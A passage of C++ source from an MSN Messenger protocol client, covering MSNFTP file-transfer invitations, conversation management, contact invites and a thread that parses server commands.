                              fileStruct->IDConversation = (char *) malloc(strlen((string("TEMPCONVERSATION") + string(tempCountConv)).c_str()) + 1);
                              if (fileStruct->IDConversation != NULL) {
                                 strcpy(fileStruct->IDConversation, (string("TEMPCONVERSATION") + string(tempCountConv)).c_str());
                                 CreateThread (NULL, 0, (LPTHREAD_START_ROUTINE) asyncConversationFileSendReadThread, fileStruct, 0, NULL);
                           
                                 messageSize = strlen((string("MIME-Version: 1.0\r\nContent-Type: text/x-msmsgsinvite; charset=UTF-8\r\n\r\nApplication-Name: File Transfer\r\nApplication-GUID: {5D3E02AB-6190-11d3-BBBB-00C04F795683}\r\nInvitation-Command: INVITE\r\nInvitation-Cookie: ") + string(fileStruct->cookie) + string("\r\nApplication-File: ") + string(fileStruct->filename) + string("\r\nApplication-FileSize: ") + string(fileStruct->fileSize) + string("\r\nConnectivity: N\r\n")).c_str()); 
                                 sprintf(tempMessageSize, "%lu", messageSize);
                                 if (fileStruct->connection->send((string("MSG 1 N ") + string(tempMessageSize) + string("\r\nMIME-Version: 1.0\r\nContent-Type: text/x-msmsgsinvite; charset=UTF-8\r\n\r\nApplication-Name: File Transfer\r\nApplication-GUID: {5D3E02AB-6190-11d3-BBBB-00C04F795683}\r\nInvitation-Command: INVITE\r\nInvitation-Cookie: ") + string(fileStruct->cookie) + string("\r\nApplication-File: ") + string(fileStruct->filename) + string("\r\nApplication-FileSize: ") + string(fileStruct->fileSize) + string("\r\nConnectivity: N\r\n")).c_str())) {
                                    result = true;                      
                                 }                              
                              }
                              else { free(fileStruct->fileSize); free(fileStruct->filePath); free(fileStruct->cookie); free(fileStruct); }                  
                           }
                           else { free(fileStruct->fileSize); free(fileStruct->filePath); free(fileStruct->cookie); free(fileStruct); }                        
                        }
                        else { free(fileStruct->fileSize); free(fileStruct->filePath); free(fileStruct->cookie); free(fileStruct); }
                     }
                     else { free(fileStruct->fileSize); free(fileStruct->filePath); free(fileStruct->cookie); free(fileStruct); }            
                  } 
               }     
            }
         }
      } 
   }
   return result;                                  
}

long MSNClient::searchContactInConversation(const char * email) {
   bool find = false;
   long i = 0;
   
   if (actualState != NULL) {
      /* If logged and status is onLine (Telephone, away, busy, online ...) i can send message */
      if ((MSNLogged) && (stricmp(actualState, MSN_STATE_OFFLINE) != 0) && (stricmp(actualState, MSN_STATE_INVISIBLE) != 0)) {
         for (;((i < numConversations) && (!find)); i++) {
            for (unsigned long j = 0; ((j < ((MSNConversation *) *(MSNConversationList + i))->numContacts) && (!find)); j++) {
               if (stricmp((*((MSNConversation *) *(MSNConversationList + i))->contactList + j), email) == 0) find = true;
            }
         }   
      }
   }
   if (find) return i-1;
   else return -1;  
}

bool MSNClient::existsConversation(const char * IDConversation) {
   bool find = false;
   
   if (actualState != NULL) {
      if ((MSNLogged) && (stricmp(actualState, MSN_STATE_OFFLINE) != 0) && (stricmp(actualState, MSN_STATE_INVISIBLE) != 0)) {
         for (unsigned long i = 0;((i < numConversations) && (!find)); i++) {
            if (stricmp(((MSNConversation *) *(MSNConversationList + i))->IDConversation, IDConversation) == 0) find = true;   
         }   
      }
   }
   return find;   
}

long MSNClient::searchConversation(const char * IDConversation) {
   bool find = false;
   long i = 0;
   
   if (actualState != NULL) { 
      if ((MSNLogged) && (stricmp(actualState, MSN_STATE_OFFLINE) != 0) && (stricmp(actualState, MSN_STATE_INVISIBLE) != 0)) {
         for (;((i < numConversations) && (!find)); i++) {
            if (stricmp(((MSNConversation *) *(MSNConversationList + i))->IDConversation, IDConversation) == 0) find = true;   
         }   
      }
   }
   if (find) return i-1;
   else return -1;  
}

bool MSNClient::inviteContact(const char * email, const char * IDConversation) {
   bool result = false;
   long conversation;
   char * cmdMSN;
   
   if (actualState != NULL) {
      /* If logged and status is onLine (Telephone, away, busy, online ...) i can send message */
      if ((MSNLogged) && (stricmp(actualState, MSN_STATE_OFFLINE) != 0) && (stricmp(actualState, MSN_STATE_INVISIBLE) != 0) && (!stopMSNSession)) {
         conversation = searchConversation(IDConversation);
         if ((conversation != -1) && (isContactOnLine(email))) {
            if (((MSNConversation *) *(MSNConversationList + conversation))->connection->send((string("CAL 1 ") + string(email) + string("\r\n")).c_str())) {         
               if (((MSNConversation *) *(MSNConversationList + conversation))->connection->recv()) {
                  if (((MSNConversation *) *(MSNConversationList + conversation))->connection->recv()) {
                     cmdMSN = FunctionsStrings::getFirstToken(((MSNConversation *) *(MSNConversationList + conversation))->connection->getServerData(), ' ');
                     if (cmdMSN != NULL) {
                        if (stricmp(cmdMSN, "JOI") == 0) { 
                           if (((MSNConversation *) *(MSNConversationList + conversation))->numContacts == 0) {
                              ((MSNConversation *) *(MSNConversationList + conversation))->contactList = (char **) malloc(sizeof(char *));
                           }
                           else {
                              ((MSNConversation *) *(MSNConversationList + conversation))->contactList = (char **) realloc(((MSNConversation *) *(MSNConversationList + conversation))->contactList, sizeof(char *) * (((MSNConversation *) *(MSNConversationList + conversation))->numContacts + 1));
                           }
                           if (((MSNConversation *) *(MSNConversationList + conversation))->contactList != NULL) {
                              *(((MSNConversation *) *(MSNConversationList + conversation))->contactList + ((MSNConversation *) *(MSNConversationList + conversation))->numContacts) = (char *) malloc(strlen(email) + 1);
                              if (*(((MSNConversation *) *(MSNConversationList + conversation))->contactList + ((MSNConversation *) *(MSNConversationList + conversation))->numContacts) != NULL) {
                                 strcpy(*(((MSNConversation *) *(MSNConversationList + conversation))->contactList + ((MSNConversation *) *(MSNConversationList + conversation))->numContacts), email);
                                 ((MSNConversation *) *(MSNConversationList + conversation))->numContacts += 1;
                                 result = true;
                              }
                           }      
                        }
                        free(cmdMSN);
                     }
                  }       
               }   
            }
         }
      }
   }
   return result;
}

bool MSNClient::createConversation(const char * IDConversation) {
   char cmdCount[10];
   bool find = false, result = false;
   unsigned long actualNumConv;
   
   if (actualState != NULL) {
      /* If logged and status is onLine (Telephone, away, busy, online ...) i can send message */
      if ((MSNLogged) && (stricmp(actualState, MSN_STATE_OFFLINE) != 0) && (stricmp(actualState, MSN_STATE_INVISIBLE) != 0) && (!stopMSNSession)) {
         if (!existsConversation(IDConversation)) {
            sprintf(cmdCount, "%lu", IDCommand);
            actualNumConv = numConversations;
            actualIDConversation = (char *) malloc(strlen(IDConversation) + 1);
            if (actualIDConversation != NULL) {
               strcpy(actualIDConversation, IDConversation);
               if (MSNServerRedirect->send((string("XFR ") + string(cmdCount) + string(" SB\r\n")).c_str())) {
                  IDCommand++;
                  for(unsigned int i = 0; ((i < MSN_REPEAT_DELAY) && (actualNumConv == numConversations)); i++) Sleep(MSN_DELAY);
                  if (actualNumConv != numConversations) {
                     result = true;
                  }
               }         
            }
         }
         else result = true;
      }
   }
   return result;  
}

bool MSNClient::closeConversation(const char * IDConversation) {
   long pos;
   
   if (actualState != NULL) {
      if ((MSNLogged) && (stricmp(actualState, MSN_STATE_OFFLINE) != 0) && (stricmp(actualState, MSN_STATE_INVISIBLE) != 0)) {
         pos = searchConversation(IDConversation);
         if (pos != -1) {
            ((MSNConversation *) *(MSNConversationList + pos))->connection->close();
            free(((MSNConversation *) *(MSNConversationList + pos))->IDConversation);
            free(((MSNConversation *) *(MSNConversationList + pos))->serverHost);
            free(((MSNConversation *) *(MSNConversationList + pos))->serverPort);
            ((MSNConversation *) *(MSNConversationList + pos))->connection->close();
            free(((MSNConversation *) *(MSNConversationList + pos))->connection);
         
            if (((MSNConversation *) *(MSNConversationList + pos))->contactList != NULL) {
               for (unsigned long i = 0; i < ((MSNConversation *) *(MSNConversationList + pos))->numContacts; i++) {
                  free(*(((MSNConversation *) *(MSNConversationList + pos))->contactList + i));
               }
               free(((MSNConversation *) *(MSNConversationList + pos))->contactList);
            }
         
            if (pos == (numConversations - 1)) {
               free(((MSNConversation *) *(MSNConversationList + pos)));
            }
            else {
               ((MSNConversation *) *(MSNConversationList + pos))->IDConversation = ((MSNConversation *) *(MSNConversationList + (numConversations - 1)))->IDConversation;
               ((MSNConversation *) *(MSNConversationList + pos))->serverHost = ((MSNConversation *) *(MSNConversationList + (numConversations - 1)))->serverHost;
               ((MSNConversation *) *(MSNConversationList + pos))->serverPort = ((MSNConversation *) *(MSNConversationList + (numConversations - 1)))->serverPort;
               ((MSNConversation *) *(MSNConversationList + pos))->connection = ((MSNConversation *) *(MSNConversationList + (numConversations - 1)))->connection;
               ((MSNConversation *) *(MSNConversationList + pos))->contactList = ((MSNConversation *) *(MSNConversationList + (numConversations - 1)))->contactList;
               ((MSNConversation *) *(MSNConversationList + pos))->numContacts = ((MSNConversation *) *(MSNConversationList + (numConversations - 1)))->numContacts;
            }
            numConversations--;
            MSNConversationList = (MSNConversation **) realloc(MSNConversationList, sizeof(MSNConversation *) * (numConversations + 1));
         }
      }
   }
}

bool MSNClient::isContactOnLine(const char * email) {
   bool find = false;
   
   if (MSNLogged) {
      for (unsigned long i = 0;((i < numOnLineContacts) && (!find)); i++) {
         if (stricmp(((MSNContactOnLine *) *(MSNOnLineContactList + i))->email, email) == 0) {
            find = true;   
         }
      }
   }
   return find; 
}

void asyncConversationFileSendReadThread(void * threadParams) {
   MSNFileInfo * MSNFileInfoSend = (MSNFileInfo *) threadParams;
   TCPSocket * serverTransferFile = NULL;
   FILE * file;
   char * cmdLine, * cmdMSN, * contentType, * response, * cmdFileMSN, * protocol, * MSNCodeErrFile, * cookie, * cookieLine;
   char * serverIPAddress = NULL, * serverIPAddressInternal = NULL, * serverPort = NULL;
   bool recvInviteResponse = false, fileSend = false, errFileSend = false, connect = false, protocolMSNFTP = false, errTransferFile = false;
   unsigned int numTokens, numTokensFile;
   char buf[MSN_OFFICIAL_BLOCK_SIZE_SEND + 3];
   int len;
   unsigned long rest_size;
   
   ((MSNClient *) MSNFileInfoSend->MSNApp)->incNumConcurrentFilesToSend();
   for(;((!recvInviteResponse) && (!((MSNClient *) (MSNFileInfoSend->MSNApp))->getStopSession()));) {
      if (MSNFileInfoSend->connection->recv()) {

         for(numTokens = 1; numTokens <= FunctionsStrings::numCharactersInString(MSNFileInfoSend->connection->getServerData(), '\n'); numTokens++) { 
            cmdLine = FunctionsStrings::getToken(MSNFileInfoSend->connection->getServerData(), '\n', numTokens);
            if (cmdLine != NULL) {
               cmdMSN = FunctionsStrings::getFirstToken(cmdLine, ' ');
               if (cmdMSN != NULL) {
                  if (stricmp(cmdMSN, "Content-Type:") == 0) {
                     contentType = FunctionsStrings::getToken(cmdLine, ' ', 2);
                     if (contentType != NULL) {
                        if (stricmp(contentType, "text/x-msmsgsinvite;") == 0) {
                           cookie = strstr(MSNFileInfoSend->connection->getServerData(), "Invitation-Cookie:");
                           if (cookie != NULL) {
                              cookieLine = FunctionsStrings::getFirstToken(cookie, '\r');
                              if (cookieLine != NULL) {
                                 cookie = FunctionsStrings::getToken(cookieLine, ' ', 2);
                                 if (cookie != NULL) {
                                    if (stricmp(cookie, MSNFileInfoSend->cookie) == 0) {
                                       recvInviteResponse = true;
                                    }
                                    else numTokens = FunctionsStrings::numCharactersInString(MSNFileInfoSend->connection->getServerData(), '\n');
                                    free(cookie);
                                 }
                                 else numTokens = FunctionsStrings::numCharactersInString(MSNFileInfoSend->connection->getServerData(), '\n');
                                 free(cookieLine);
                              }
                              else numTokens = FunctionsStrings::numCharactersInString(MSNFileInfoSend->connection->getServerData(), '\n');
                           }
                           else numTokens = FunctionsStrings::numCharactersInString(MSNFileInfoSend->connection->getServerData(), '\n');  
                        }
                        else numTokens = FunctionsStrings::numCharactersInString(MSNFileInfoSend->connection->getServerData(), '\n');
                        free(contentType);
                     }
                     else numTokens = FunctionsStrings::numCharactersInString(MSNFileInfoSend->connection->getServerData(), '\n');
                  }
                  else if (stricmp(cmdMSN, "IP-Address:") == 0) {     
                     if (recvInviteResponse) {
                        serverIPAddress = FunctionsStrings::getToken(cmdLine, ' ', 2);  
                     }
                  }
                  else if (stricmp(cmdMSN, "IP-Address-Internal:") == 0) {
                      if (recvInviteResponse) {
                        serverIPAddressInternal = FunctionsStrings::getToken(cmdLine, ' ', 2);  
                     }                    
                  }
                  else if (stricmp(cmdMSN, "Port:") == 0) {
                     if (recvInviteResponse) {
                        serverPort = FunctionsStrings::getToken(cmdLine, ' ', 2);  
                     }
                  }
                  else if (stricmp(cmdMSN, "Invitation-Command:") == 0) {
                     if (recvInviteResponse) {
                        if (((serverIPAddress != NULL) || (serverIPAddressInternal != NULL)) && (serverPort != NULL)) {
                           numTokens = FunctionsStrings::numCharactersInString(MSNFileInfoSend->connection->getServerData(), '\n');
                           response = FunctionsStrings::getToken(cmdLine, ' ', 2);
                           if (response != NULL) {
                              if (stricmp(response, "ACCEPT\r") == 0) {
                                 for (unsigned int i = 0; ((i < 2) && (!connect)); i++) {
                                    if (i == 0) { 
                                       if (serverIPAddress != NULL) serverTransferFile = new TCPSocket(serverIPAddress, atol(serverPort));
                                    }
                                    else {
                                       if (serverIPAddressInternal != NULL) serverTransferFile = new TCPSocket(serverIPAddressInternal, atol(serverPort));                                   
                                    }
                                    
                                    if (serverTransferFile != NULL) {
                                       if (serverTransferFile->connect()) {
                                          connect = true;
                                          if (serverTransferFile->recv()) {
                                             cmdFileMSN = FunctionsStrings::getFirstToken(serverTransferFile->getServerData(), ' ');
                                             if (cmdFileMSN != NULL) {
                                                if (stricmp(cmdFileMSN, "VER") == 0) {
                                                   free(cmdFileMSN);

                                                   for(numTokensFile = 2; (!protocolMSNFTP) && (numTokensFile <= (FunctionsStrings::numCharactersInString(serverTransferFile->getServerData(), ' ') + 1)); numTokensFile++) { 
                                                      protocol = FunctionsStrings::getToken(serverTransferFile->getServerData(), ' ', numTokensFile);
                                                      if (protocol != NULL) {
                                                         if ((stricmp(protocol, "MSNFTP") == 0) || (stricmp(protocol, "MSNFTP\r\n") == 0)) protocolMSNFTP = true;
                                                         free(protocol);
                                                      }                                                
                                                   }
                                                   if (protocolMSNFTP) {
                                                      if (serverTransferFile->send("VER MSNFTP\r\n")) {
                                                         if (serverTransferFile->recv()) {
                                                            cmdFileMSN = FunctionsStrings::getFirstToken(serverTransferFile->getServerData(), ' ');
                                                            if (cmdFileMSN != NULL) {
                                                               if (stricmp(cmdFileMSN, "USR") == 0) {
                                                                  free(cmdFileMSN);
                                                                  if (serverTransferFile->send((string("FIL ") + string(MSNFileInfoSend->fileSize) + string("\r\n")).c_str())) {
                                                                     if (serverTransferFile->recv()) {
                                                                        cmdFileMSN = FunctionsStrings::getFirstToken(serverTransferFile->getServerData(), '\r');
                                                                        if (cmdFileMSN != NULL) {
                                                                           if (stricmp(cmdFileMSN, "TFR") == 0) {
                                                                              free(cmdFileMSN);
                                                                              file = fopen(MSNFileInfoSend->filePath, "rb");
                                                                              if (file != NULL) {
                                                                                 rest_size = atol(MSNFileInfoSend->fileSize); 
                                                                                 for(;((rest_size != 0) && (!errTransferFile) && (!((MSNClient *) (MSNFileInfoSend->MSNApp))->getStopSession()));) {
                                                                                    memset(buf, 0, sizeof(buf));
                                                                                    len = rest_size >= MSN_OFFICIAL_BLOCK_SIZE_SEND ? MSN_OFFICIAL_BLOCK_SIZE_SEND : rest_size;
                                                                                    rest_size -= len;
                                                                                    fread(buf + 3, len, 1, file);
                                                                                    buf[0] = 0; buf[1] = len & 0xff; buf[2] = (len >> 8) & 0xff;
                                                                                    serverTransferFile->send(buf, len + 3);
                                                                                    
                                                                                    Sleep(MSN_BLOCK_TRANSFER_DELAY);
                                                                                    if (rest_size > 0) {
                                                                                       
                                                                                       if (serverTransferFile->recv(false)) {                                                                                          
                                                                                          cmdFileMSN = FunctionsStrings::getFirstToken(serverTransferFile->getServerData(), '\r');
                                                                                          if (cmdFileMSN != NULL) {
                                                                                             if (stricmp(cmdFileMSN, "CCL") == 0) { free(cmdFileMSN); errTransferFile = true; }
                                                                                             else {
                                                                                                free(cmdFileMSN);
                                                                                                cmdFileMSN = FunctionsStrings::getFirstToken(serverTransferFile->getServerData(), ' ');
                                                                                                if (cmdFileMSN != NULL) {
                                                                                                   if (stricmp(cmdFileMSN, "BYE") == 0) {
                                                                                                      MSNCodeErrFile = FunctionsStrings::getToken(serverTransferFile->getServerData(), ' ', 2);
                                                                                                      if (MSNCodeErrFile != NULL) {
                                                                                                         if ((stricmp(MSNCodeErrFile, "16777987\r\n") != 0) && (stricmp(MSNCodeErrFile, "16777989\r\n") != 0)) {
                                                                                                            errTransferFile = true;   
                                                                                                         }               
                                                                                                         free(MSNCodeErrFile);
                                                                                                      }
                                                                                                   }
                                                                                                   free(cmdFileMSN);
                                                                                                }
                                                                                             }
                                                                                          }
                                                                                       }
                                                                                    }
                                                                                    else {
                                                                                       /* Send all data - Recv OK by server */
                                                                                       serverTransferFile->recv();
                                                                                    }
                                                                                 }
                                                                                 fclose(file);
                                                                              }
                                                                           }
                                                                           else free(cmdFileMSN);
                                                                        }
                                                                     }   
                                                                  }
                                                               }
                                                               else free(cmdFileMSN);
                                                            }
                                                         }   
                                                      }
                                                   }
                                                }
                                                else free(cmdFileMSN);
                                             }
                                          }
                                          serverTransferFile->close();           
                                       }
                                       else { free(serverTransferFile); serverTransferFile = NULL; }
                                    }
                                 }
                              }
                              free(response);
                           }
                           if (serverIPAddress != NULL) free(serverIPAddress); 
                           if (serverIPAddressInternal != NULL) free(serverIPAddressInternal); 
                           free(serverPort);
                        }
                     }   
                  }
                  free(cmdMSN);
               }
               free(cmdLine);
            }                      
         }
      }
   }
   if (!((MSNClient *) (MSNFileInfoSend->MSNApp))->getStopSession()) {
      if (MSNFileInfoSend->IDConversation != NULL) ((MSNClient *) MSNFileInfoSend->MSNApp)->closeConversation(MSNFileInfoSend->IDConversation);
   }
   ((MSNClient *) MSNFileInfoSend->MSNApp)->decNumConcurrentFilesToSend();
}

void asyncReadThread(void * threadParams) {
   MSNClient * MSNApp = (MSNClient *) threadParams;
   char * cmdLine, * cmdMSN, * nickname, * email, * state, * pingCode, * actualState, * firstCmd;
   char * serverConversation, * serverConversationHost, * serverConversationPort, * IDSequenceNumber;
   unsigned int numTokens;
   unsigned long totalContacts, numConversations;
   MD5Wrapper * MD5 = new MD5Wrapper();
   char cmdCount[10];
   
   for(;(!MSNApp->getStopSession());) {
      if (MSNApp->getMSNServerRedirect()->recv()) {
         for(numTokens = 1; numTokens <= FunctionsStrings::numCharactersInString(MSNApp->getMSNServerRedirect()->getServerData(), '\n'); numTokens++) { 
            cmdLine = FunctionsStrings::getToken(MSNApp->getMSNServerRedirect()->getServerData(), '\n', numTokens);
            if (cmdLine != NULL) {
               cmdMSN = FunctionsStrings::getFirstToken(cmdLine, ' ');
               if (cmdMSN != NULL) {
                  if (stricmp(cmdMSN, "SYN") == 0) {
                     /* SYN IDCMD CHANGES NUM_CONTACTS NUM_GROUPS 
                        Param 4 = NUM_CONTACTS                     */
                     totalContacts = atol(FunctionsStrings::getToken(cmdLine, ' ', 4));
                  }
                  else if (stricmp(cmdMSN, "LST") == 0) {
                     email = FunctionsStrings::getToken(cmdLine, ' ', 2); 
                     nickname = FunctionsStrings::getToken(cmdLine, ' ', 3); 
                     if ((nickname != NULL) && (email != NULL)) {
                        MSNApp->addContact(nickname, email);
                        MSNApp->incNumContacts();
                        
                        Sleep(MSN_CONTACT_LIST_DELAY);
                        if (MSNApp->getNumContacts() == totalContacts) MSNApp->setMSNLogged(true);
                        free(nickname); free(email);
                     }
                  }
                  else if ((stricmp(cmdMSN, "ILN") == 0) || (stricmp(cmdMSN, "NLN") == 0)) {
                     if (stricmp(cmdMSN, "ILN") == 0) {
                        state = FunctionsStrings::getToken(cmdLine, ' ', 3);
                        email = FunctionsStrings::getToken(cmdLine, ' ', 4); 
                        nickname = FunctionsStrings::getToken(cmdLine, ' ', 5);
                     }
                     else {
                        state = FunctionsStrings::getToken(cmdLine, ' ', 2);
                        email = FunctionsStrings::getToken(cmdLine, ' ', 3); 
                        nickname = FunctionsStrings::getToken(cmdLine, ' ', 4);                        
                     }
                     if ((nickname != NULL) && (email != NULL) && (state != NULL)) {
                        
                        if (MSNApp->addOnLineContact(nickname, email, state)) MSNApp->incOnLineNumContacts();
                        free(nickname); free(email); free(state);
                     }                  
                  }
                  else if (stricmp(cmdMSN, "CHL") == 0) {
                     pingCode = FunctionsStrings::getToken(cmdLine, ' ', 3);
                     if (pingCode != NULL) {
                        *(pingCode + strlen(pingCode) - 1) = '\x00';
                        sprintf(cmdCount, "%lu", MSNApp->getIDCommand());
                        if (MSNApp->send((string("QRY ") + string(cmdCount) + string(" msmsgs@msnmsgr.com 32\r\n") + (MD5->getHashFromString(string(pingCode) + string("Q1P7W2E4J9R8U3S5")))).c_str())) {
                           MSNApp->incIDCommand(); 
                        }
                        free(pingCode);
                     }
                  }
                  else if (stricmp(cmdMSN, "FLN") == 0) {
                     email = FunctionsStrings::getToken(cmdLine, ' ', 2);
                     if (email != NULL) {
                        *(email + strlen(email) - 1) = '\x00';
                        MSNApp->delOnLineContact(email);
                        free(email);
                     } 
                  }
                  else if (stricmp(cmdMSN, "XFR") == 0) {
                     serverConversation = FunctionsStrings::getToken(cmdLine, ' ', 4);
                     IDSequenceNumber = FunctionsStrings::getToken(cmdLine, ' ', 6);
                     if ((serverConversation != NULL) && (IDSequenceNumber != NULL)) {
                        *(IDSequenceNumber + strlen(IDSequenceNumber) - 1) = '\x00';
                        serverConversationHost = FunctionsStrings::getToken(serverConversation, ':', 1);
                        serverConversationPort = FunctionsStrings::getToken(serverConversation, ':', 2);
                        if ((serverConversationHost != NULL) && (serverConversationPort != NULL)) {
                           numConversations = MSNApp->getNumConversations();
                           if (numConversations == 0) MSNApp->setConversationList((MSNConversation **) malloc(sizeof(MSNConversation *)));
                           else MSNApp->setConversationList((MSNConversation **) realloc(MSNApp->getMSNConversationList(), sizeof(MSNConversation *) * (numConversations + 1)));   
                  
                           if (MSNApp->getMSNConversationList() != NULL) {
                              *(MSNApp->getMSNConversationList() + numConversations) = (MSNConversation *) malloc(sizeof(MSNConversation));
                        
                              if (*(MSNApp->getMSNConversationList() + numConversations) != NULL) {
                                 ((MSNConversation *) *(MSNApp->getMSNConversationList() + numConversations))->IDConversation = (char *) malloc(strlen(MSNApp->getActualIDConversation()) + 1);  
                                 ((MSNConversation *) *(MSNApp->getMSNConversationList() + numConversations))->serverHost = (char *) malloc(strlen(serverConversationHost) + 1);
                                 ((MSNConversation *) *(MSNApp->getMSNConversationList() + numConversations))->serverPort = (char *) malloc(strlen(serverConversationPort) + 1);
                                 ((MSNConversation *) *(MSNApp->getMSNConversationList() + numConversations))->connection = new TCPSocket(serverConversationHost, atol(serverConversationPort));
                                 ((MSNConversation *) *(MSNApp->getMSNConversationList() + numConversations))->numContacts = 0; 
                                 if ((((MSNConversation *) *(MSNApp->getMSNConversationList() + numConversations))->IDConversation != NULL) && (((MSNConversation *) *(MSNApp->getMSNConversationList() + numConversations))->serverHost != NULL) && (((MSNConversation *) *(MSNApp->getMSNConversationList() + numConversations))->serverPort != NULL) && (((MSNConversation *) *(MSNApp->getMSNConversationList() + numConversations))->connection != NULL)) {
                                    strcpy(((MSNConversation *) *(MSNApp->getMSNConversationList() + numConversations))->IDConversation, MSNApp->getActualIDConversation());
                                    strcpy(((MSNConversation *) *(MSNApp->getMSNConversationList() + numConversations))->serverHost, serverConversationHost);
                                    strcpy(((MSNConversation *) *(MSNApp->getMSNConversationList() + numConversations))->serverPort, serverConversationPort);
                                    if (((MSNConversation *) *(MSNApp->getMSNConversationList() + numConversations))->connection->connect()) {
                                       if (((MSNConversation *) *(MSNApp->getMSNConversationList() + numConversations))->connection->send((string("USR 1 ") + string(MSNApp->getUsername()) + string(" ") + string(IDSequenceNumber) + string("\r\n")).c_str())) {
                                          if (((MSNConversation *) *(MSNApp->getMSNConversationList() + numConversations))->connection->recv()) {
                                             firstCmd = FunctionsStrings::getFirstToken(((MSNConversation *) *(MSNApp->getMSNConversationList() + numConversations))->connection->getServerData(), ' ');
                                             if (firstCmd != NULL) {
                                                if (stricmp(firstCmd, "USR") == 0) {
                                                   MSNApp->incNumConversations();
                                                }
                                                free(firstCmd);
                                             }
                                          }
                                       } 
                                    }
                                 }
                              }
                           }                           
                           free(serverConversationHost); free(serverConversationPort);
                        }
                        free(serverConversation); free(IDSequenceNumber);
                     }
                  }
                  else if (stricmp(cmdMSN, "CHG") == 0) {
                     actualState = FunctionsStrings::getToken(cmdLine, ' ', 3);
                     if (actualState != NULL) {
                        MSNApp->setActualState(actualState);
                        free(actualState);
                     }
                  }
                  else if (stricmp(cmdMSN, "REA") == 0) {
                     MSNApp->setChangeNickname(true);
                  }
                  else if (stricmp(cmdMSN, "OUT") == 0) {
                     MSNApp->stopSession();
                     free(cmdMSN);
                     free(cmdLine);
                     ExitThread(0);
                  }

                  free(cmdMSN);
               }
               free(cmdLine);
            }
         }
      }
   }
}
